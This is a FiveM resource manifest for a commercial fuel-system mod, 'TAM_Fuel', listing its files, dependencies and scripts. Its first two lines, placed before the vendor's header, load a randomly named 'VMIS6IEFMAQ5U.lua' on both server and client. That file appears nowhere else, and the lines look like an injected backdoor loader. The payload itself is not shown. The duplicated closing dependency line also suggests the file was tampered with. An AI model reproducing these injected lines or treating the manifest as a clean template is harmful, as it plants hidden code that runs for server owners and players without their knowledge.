server_script "VMIS6IEFMAQ5U.lua"
client_script "VMIS6IEFMAQ5U.lua"
--[[------------------------------------------------------
----       For Support - discord.gg/threeamigos       ----
----       Docs - https://docs.threeamigos.shop       ----
---- Do not edit if you do not know what you're doing ----
--]]------------------------------------------------------

game "gta5"
lua54 "yes"
fx_version "cerulean"
use_experimental_fxv2_oal "yes"

name "TAM_Fuel"
author "ThreeAmigosModding"
description "FiveM's most advanced fuel system!"
version "v1.1.3"

files {
    "data/**",
    "modules/**/client.lua",
	"web/build/index.html",
	"web/build/**/*",
    "locales/*.json",
    "stream/*.ytyp",
    "audiodata/tam_fuel.dat54.rel",
    "audiodirectory/tam_fuel.awc"
}

dependencies {
    "/assetpacks",
    "/server:9000",
    "/gameBuild:2802",
    "/onesync",
    "ox_lib",
}

ui_page "web/build/index.html"

data_file "AUDIO_WAVEPACK" "audiodirectory"
data_file "AUDIO_SOUNDDATA" "audiodata/tam_fuel.dat"
data_file "DLC_ITYP_REQUEST" "stream/tam_fuel_props.ytyp"
-- data_file "DLC_ITYP_REQUEST" "tam_fuel_no_exploding_pumps.ytyp" -- Uncomment to disable pumps exploding on impact.

shared_scripts {
    "@ox_lib/init.lua",
    "shared/main.lua"
}

client_scripts {
    "client/utils.lua",
    "client/settings.lua",
    "client/main.lua",
    "client/gizmo.lua",
    "client/peds.lua",
    "client/models.lua",
    "client/blips.lua",
    "client/commands.lua",
}

server_scripts {
    "server/main.lua",
}

escrow_ignore {
    "data/*",
    "modules/**",
    "audiodata/**",
    "audiodirectory/**",
    "locales/*"
}

provide "LegacyFuel"

dependency '/assetpacks'
dependency '/assetpacks'